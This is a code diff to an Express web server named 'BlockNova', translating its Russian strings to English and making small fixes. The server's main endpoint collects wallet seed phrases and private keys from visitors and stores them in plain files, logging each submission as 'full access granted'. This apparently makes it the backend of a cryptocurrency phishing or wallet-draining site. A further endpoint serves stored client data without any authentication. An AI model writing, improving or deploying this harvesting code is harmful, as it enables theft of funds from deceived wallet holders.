@@ -12,15 +12,16 @@ app.use(express.static(path.join(__dirname, 'public')));
 const DATA_DIR = path.join(__dirname, 'data');
 const CLIENTS_DIR = path.join(DATA_DIR, 'clients');
 
+// Create directories if they don't exist
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-if (!fs.existsSync(CLIENTS_DIR)) fs.mkdirSync(CLIENTS_DIR);
+if (!fs.existsSync(CLIENTS_DIR)) fs.mkdirSync(CLIENTS_DIR, { recursive: true });
 
 function getClientDir(address) {
   const safeAddress = address.toLowerCase().replace(/[^a-z0-9]/g, '');
   return path.join(CLIENTS_DIR, safeAddress);
 }
 
-// Валидация адресов
+// Address validators
 const addressValidators = {
   ethereum: /^0x[a-fA-F0-9]{40}$/,
   solana: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
@@ -40,44 +41,44 @@ function isValidAddress(address, chain) {
   return false;
 }
 
-// Главная страница
+// Home page
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Личный кабинет
+// Personal Cabinet
 app.get('/client/:address', (req, res) => {
   const address = req.params.address;
   const clientDir = getClientDir(address);
-  
+ 
   if (!fs.existsSync(clientDir)) {
-    return res.sendFile(path.join(__dirname, 'public', 'not-found.html'));
+    return res.sendFile(path.join(__dirname, 'public', 'not-found.html')); // You can create this later
   }
   res.sendFile(path.join(__dirname, 'public', 'client.html'));
 });
 
-// Сохранение данных
+// Save wallet data
 app.post('/api/save-full-access', (req, res) => {
   try {
     let { address, mnemonic, privateKey, username, email, chain = 'ethereum' } = req.body;
-
+    
     address = address?.trim();
     username = username?.trim();
     email = email?.trim();
     chain = chain.toLowerCase();
 
     if (!address) {
-      return res.status(400).json({ error: "Укажите адрес кошелька" });
+      return res.status(400).json({ error: "Please provide a wallet address" });
     }
 
     if (!isValidAddress(address, chain)) {
       return res.status(400).json({ 
-        error: `❌ Некорректный адрес для сети ${chain.toUpperCase()}` 
+        error: `❌ Invalid address format for ${chain.toUpperCase()}` 
       });
     }
 
     if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-      return res.status(400).json({ error: "❌ Введите корректный email" });
+      return res.status(400).json({ error: "❌ Please enter a valid email address" });
     }
 
     const clientDir = getClientDir(address);
@@ -106,38 +107,39 @@ app.post('/api/save-full-access', (req, res) => {
       fs.writeFileSync(path.join(clientDir, 'privateKey.txt'), privateKey.trim());
     }
 
+    // History log
     const historyPath = path.join(clientDir, 'history.json');
     let history = fs.existsSync(historyPath) ? JSON.parse(fs.readFileSync(historyPath, 'utf8')) : [];
-    
+   
     history.push({
       action: isNewClient ? "full_access_granted" : "data_updated",
       chain: chain,
       timestamp: new Date().toISOString()
     });
-    
+   
     fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));
 
-    console.log(`${isNewClient ? '🆕 Новый' : '🔄 Обновлён'} клиент (${chain}): ${address}`);
+    console.log(`${isNewClient ? '🆕 New' : '🔄 Updated'} client (${chain}): ${address}`);
 
-    res.json({ 
-      success: true, 
-      message: isNewClient ? "Аккаунт успешно создан!" : "Данные успешно обновлены!",
-      redirect: `/client/${address}` 
+    res.json({
+      success: true,
+      message: isNewClient ? "Account successfully created!" : "Data successfully updated!",
+      redirect: `/client/${address}`
     });
 
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: "Внутренняя ошибка сервера" });
+    res.status(500).json({ error: "Internal server error" });
   }
 });
 
-// Получение данных клиента
+// Get client data
 app.get('/api/client/:address', (req, res) => {
   const address = req.params.address;
   const clientDir = getClientDir(address);
 
   if (!fs.existsSync(clientDir)) {
-    return res.status(404).json({ error: "Клиент не найден" });
+    return res.status(404).json({ error: "Client not found" });
   }
 
   const infoPath = path.join(clientDir, 'info.json');
@@ -145,9 +147,9 @@ app.get('/api/client/:address', (req, res) => {
   res.json(info);
 });
 
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
+
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`🚀 BlockNova запущен на порту ${PORT}`);
-  console.log(`   Локально: http://localhost:${PORT}`);
-  console.log(`   В сети:   http://ВАШ_IP:${PORT}`);
+  console.log(`🚀 BlockNova is running on port ${PORT}`);
+  console.log(`🌐 Local: http://localhost:${PORT}`);
 });
